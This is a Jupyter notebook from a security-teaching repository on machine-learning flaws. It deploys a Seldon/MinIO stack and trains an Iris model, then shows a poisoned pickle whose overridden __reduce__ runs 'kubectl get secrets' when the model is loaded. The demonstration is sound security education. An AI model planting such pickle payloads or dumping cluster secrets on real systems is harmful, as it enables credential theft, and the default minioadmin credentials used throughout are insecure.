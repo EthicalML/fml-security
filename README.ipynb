{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2be05288",
   "metadata": {},
   "source": [
    "[![Awesome](images/awesome.svg)](https://github.com/sindresorhus/awesome)\n",
    "[![Maintenance](https://img.shields.io/badge/Maintained%3F-YES-green.svg)](https://github.com/EthicalML/awesome-production-machine-learning/graphs/commit-activity)\n",
    "![GitHub](https://img.shields.io/badge/Release-PROD-yellow.svg)\n",
    "![GitHub](https://img.shields.io/badge/Languages-MULTI-blue.svg)\n",
    "![GitHub](https://img.shields.io/badge/License-MIT-lightgrey.svg)\n",
    "[![GitHub](https://img.shields.io/twitter/follow/axsaucedo.svg?label=Follow)](https://twitter.com/AxSaucedo/)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f4db5d8e",
   "metadata": {},
   "source": [
    "# Flawed Machine Learning Security\n",
    "\n",
    "This Repo contains a set of resources relevant to the talk \"Secure Machine Learning at Scale with MLSecOps\", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a66df55",
   "metadata": {},
   "source": [
    "## Setup\n",
    "\n",
    "Requirements on CLIs\n",
    "* kubectl\n",
    "* istioctl\n",
    "* mc (minio client)\n",
    "* Kubernetes > 1.18\n",
    "* Python 3.7"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "41b4249d",
   "metadata": {},
   "source": [
    "### Setup Kubernetes Cluster"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7b9aa8d8",
   "metadata": {},
   "source": [
    "#### Install and setup Istio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee37f7c0",
   "metadata": {},
   "outputs": [],
   "source": [
    "!istioctl install -y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "859df841",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "kubectl apply -n istio-system -f - << END\n",
    "apiVersion: networking.istio.io/v1alpha3\n",
    "kind: Gateway\n",
    "metadata:\n",
    "  name: seldon-gateway\n",
    "spec:\n",
    "  selector:\n",
    "    istio: ingressgateway # use istio default controller\n",
    "  servers:\n",
    "  - port:\n",
    "      number: 80\n",
    "      name: http\n",
    "      protocol: HTTP\n",
    "    hosts:\n",
    "    - \"*\"\n",
    "END"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0c463754",
   "metadata": {},
   "source": [
    "#### Setup Seldon Core"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b680fbc7",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "kubectl create ns seldon-system\n",
    "helm upgrade --install \\\n",
    "    seldon-core seldon-core-operator \\\n",
    "    --repo https://storage.googleapis.com/seldon-charts  \\\n",
    "    --set usageMetrics.enabled=true --namespace seldon-system \\\n",
    "    --set istio.enabled=\"true\" --set istio.gateway=\"seldon-gateway.istio-system.svc.cluster.local\" \\\n",
    "    --version 1.13.1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "397f314d",
   "metadata": {},
   "source": [
    "#### Setup & configure MinIO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "510cdc3d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"minio\" already exists with the same configuration, skipping\n",
      "NAME: minio\n",
      "LAST DEPLOYED: Sun Apr 10 13:24:52 2022\n",
      "NAMESPACE: minio-system\n",
      "STATUS: deployed\n",
      "REVISION: 1\n",
      "TEST SUITE: None\n",
      "NOTES:\n",
      "Minio can be accessed via port 9000 on the following DNS name from within your cluster:\n",
      "minio.minio-system.svc.cluster.local\n",
      "\n",
      "To access Minio from localhost, run the below commands:\n",
      "\n",
      "  1. export POD_NAME=$(kubectl get pods --namespace minio-system -l \"release=minio\" -o jsonpath=\"{.items[0].metadata.name}\")\n",
      "\n",
      "  2. kubectl port-forward $POD_NAME 9000 --namespace minio-system\n",
      "\n",
      "Read more about port forwarding here: http://kubernetes.io/docs/user-guide/kubectl/kubectl_port-forward/\n",
      "\n",
      "You can now access Minio server on http://localhost:9000. Follow the below steps to connect to Minio server with mc client:\n",
      "\n",
      "  1. Download the Minio mc client - https://docs.minio.io/docs/minio-client-quickstart-guide\n",
      "\n",
      "  2. Get the ACCESS_KEY=$(kubectl get secret minio -o jsonpath=\"{.data.accesskey}\" | base64 --decode) and the SECRET_KEY=$(kubectl get secret minio -o jsonpath=\"{.data.secretkey}\" | base64 --decode)\n",
      "\n",
      "  3. mc alias set minio-local http://localhost:9000 \"$ACCESS_KEY\" \"$SECRET_KEY\" --api s3v4\n",
      "\n",
      "  4. mc ls minio-local\n",
      "\n",
      "Alternately, you can use your browser or the Minio SDK to access the server - https://docs.minio.io/categories/17\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Error from server (AlreadyExists): namespaces \"minio-system\" already exists\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl create ns minio-system\n",
    "helm repo add minio https://helm.min.io/\n",
    "helm install minio minio/minio \\\n",
    "    --set accessKey=minioadmin \\\n",
    "    --set secretKey=minioadmin \\\n",
    "    --namespace minio-system"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a938fce6",
   "metadata": {},
   "source": [
    "Once minio is runnning you need to open another terminal and run:\n",
    "```\n",
    "kubectl port-forward -n minio-system svc/minio 9000:9000\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "564436aa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[m\u001b[32mAdded `minio-seldon` successfully.\u001b[0m\r\n",
      "\u001b[0m"
     ]
    }
   ],
   "source": [
    "!mc config host add minio-seldon http://localhost:9000 minioadmin minioadmin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d0651626",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret/seldon-init-container-secret created\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl apply -f - << END\n",
    "apiVersion: v1\n",
    "kind: Secret\n",
    "metadata:\n",
    "  name: seldon-init-container-secret\n",
    "type: Opaque\n",
    "stringData:\n",
    "  RCLONE_CONFIG_S3_TYPE: s3\n",
    "  RCLONE_CONFIG_S3_PROVIDER: minio\n",
    "  RCLONE_CONFIG_S3_ACCESS_KEY_ID: minioadmin\n",
    "  RCLONE_CONFIG_S3_SECRET_ACCESS_KEY: minioadmin\n",
    "  RCLONE_CONFIG_S3_ENDPOINT: http://minio.minio-system.svc.cluster.local:9000\n",
    "  RCLONE_CONFIG_S3_ENV_AUTH: \"false\"\n",
    "END"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc15ccb7",
   "metadata": {},
   "source": [
    "## Model Training"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5d5255f0",
   "metadata": {},
   "source": [
    "#### Install requirements for model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a88fdcae",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing requirements.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile requirements.txt\n",
    "seldon_core\n",
    "scikit-learn == 0.24.2\n",
    "numpy >= 1.8.2\n",
    "joblib == 0.16.0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2da2eac",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install -r requirements.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "38034f46",
   "metadata": {},
   "source": [
    "#### Import datasets to train Iris model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "818f8623",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn import datasets\n",
    "\n",
    "iris = datasets.load_iris()\n",
    "X, y = iris.data, iris.target"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f2b36bf2",
   "metadata": {},
   "source": [
    "#### Import simple LogsticRegression model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "5436b388",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "\n",
    "model = LogisticRegression(solver=\"liblinear\", multi_class='ovr')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f06806cc",
   "metadata": {},
   "source": [
    "#### Train model with dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1aedeb50",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "LogisticRegression(multi_class='ovr', solver='liblinear')"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.fit(X, y)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f145733e",
   "metadata": {},
   "source": [
    "#### Run prediction to test model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f7977ace",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2043cf6a",
   "metadata": {},
   "source": [
    "#### Dump model binary with pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "70904fa7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['model.joblib']"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import joblib\n",
    "\n",
    "joblib.dump(model, \"model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37230e86",
   "metadata": {},
   "outputs": [],
   "source": [
    "!bat model.joblib"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3752ac47",
   "metadata": {},
   "source": [
    "## Load Pickle and Inject Malicious Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "c0664e95",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_safe = joblib.load(\"model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "8ceed18d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model_safe.predict(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "2302018b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import types, os\n",
    "\n",
    "def __reduce__(self):\n",
    "    cmd = \"kubectl get secrets -o yaml > kubernetes-secrets.txt\"\n",
    "    return os.system, (cmd,)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "cc22e854",
   "metadata": {},
   "outputs": [],
   "source": [
    "model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__class__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "b5449137",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['model_unsafe.joblib']"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "joblib.dump(model_safe, \"model_unsafe.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cb2f9d5b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!bat model_unsafe.joblib"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54eb928e",
   "metadata": {},
   "source": [
    "#### Now reload the insecure pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "edd3214b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access 'kubernetes-secrets.txt': No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "!ls kubernetes-secrets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "bea5a7f3",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_unsafe = joblib.load(\"model_unsafe.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "ef57dee8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "apiVersion: v1\r\n",
      "items:\r\n",
      "- apiVersion: v1\r\n",
      "  data:\r\n"
     ]
    }
   ],
   "source": [
    "!head -4 kubernetes-secrets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a750567e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
